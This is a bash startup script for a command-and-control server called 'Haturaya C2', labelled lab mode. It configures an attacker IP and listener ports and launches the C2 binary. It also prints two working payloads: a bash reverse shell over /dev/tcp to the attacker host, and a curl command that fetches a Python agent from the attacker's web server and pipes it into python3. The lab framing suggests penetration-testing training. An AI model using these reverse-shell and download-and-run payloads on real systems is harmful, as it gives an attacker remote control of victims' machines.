#!/bin/bash
set -e

LHOST="${LHOST:-172.20.0.2}"
LPORT="${LPORT:-9999}"
WEB_PORT="${WEB_PORT:-9090}"

echo ""
echo "  ╔════════════════════════════════════════╗"
echo "  ║        Haturaya C2 — Lab Mode           ║"
echo "  ╚════════════════════════════════════════╝"
echo ""
echo "  Attacker IP : $LHOST"
echo "  C2 Port     : $LPORT"
echo "  Web Port    : $WEB_PORT"
echo ""
echo "  Payloads:"
echo "    bash   → /bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
echo "    python → curl http://$LHOST:$WEB_PORT/payloads/agent.py | python3"
echo ""

# Start Haturaya C2 (Go binary handles both C2 + web server)
cd /opt/haturaya
exec ./haturaya-c2 0.0.0.0 "$LPORT" "$WEB_PORT"
